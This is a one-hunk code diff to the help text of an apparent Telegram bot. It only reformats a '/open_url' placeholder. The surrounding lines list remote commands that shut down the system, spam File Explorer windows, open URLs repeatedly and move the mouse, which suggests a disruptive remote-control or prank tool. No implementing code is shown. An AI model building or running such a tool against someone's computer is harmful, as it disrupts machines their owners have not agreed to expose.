@@ -69,7 +69,7 @@ def send_welcome(message):
         "/shutdown - Shutdown the system\n"
         "/explorer_spam - Spam File Explorer windows\n"
         "/stop_explorer_spam - Stop File Explorer spam\n"
-        "/open_url <url> - Open a URL in the default browser\n"
+        "/open_url url - Open a URL in the default browser\n"
         "/stop_url - Stop opening URLs"
         "/photo - Set a custom wallpaper\n"
         "/mouse x y - Move the mouse to a specified position\n"
